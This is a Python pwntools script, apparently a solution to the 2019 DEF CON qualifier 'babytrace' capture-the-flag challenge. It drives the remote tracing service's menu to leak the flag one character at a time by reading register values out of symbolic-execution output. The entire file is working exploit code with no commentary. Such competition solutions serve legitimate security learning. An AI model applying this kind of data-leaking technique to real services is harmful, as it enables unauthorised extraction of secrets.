#!/usr/bin/env python

from pwn import *

def connect():
    global p
    p = remote("babytrace.quals2019.oooverflow.io", 5000)

def add_constrained(name, contents):
    p.sendlineafter("Choice: ", "2") # Constrained
    p.sendlineafter("name: ", name) # Name
    p.sendlineafter("(in hex): ", contents) # Contents

def add_unconstrained(name, num_bytes):
    p.sendlineafter("Choice: ", "1") # Unconstrained input
    p.sendlineafter("name: ", name) # Name
    p.sendlineafter("(in bytes): ", str(num_bytes)) # Bytes

def add_concrete(inp):
    p.sendlineafter("Choice: ", "3") # Concrete input
    p.sendlineafter(" (in hex): ", inp) # Concrete input

def symbolize_reg(reg):
    p.sendlineafter("Choice: ", "6") 
    p.sendlineafter("Register name? ", reg)
    
def read_reg_val(reg):
    symbolize_reg(reg)
    p.sendlineafter("Choice: ", "7")
    p.recvuntil("CONSTRAINTS: [<Bool ")
    val = int(p.recvuntil(" ", drop=True), 16)
    return val

def get_flag_char(i):
    global p
    connect()

    #
    # Setup
    #

    p.sendlineafter("Choice: ", "2")
    p.sendlineafter("Choice: ", "1") # Start trace

    add_concrete('{:02x}000000'.format(i))
    p.sendlineafter("Choice: ", "0") # Done
    p.sendlineafter("Choice: ", "1") # Step
    p.sendlineafter("steps: ", "11") # Eax has been populated
    char = chr(read_reg_val('eax'))

    p.close()

    return char

flag = ""
i = 0

while True:
    flag += get_flag_char(i)
    print(flag)
    i += 1

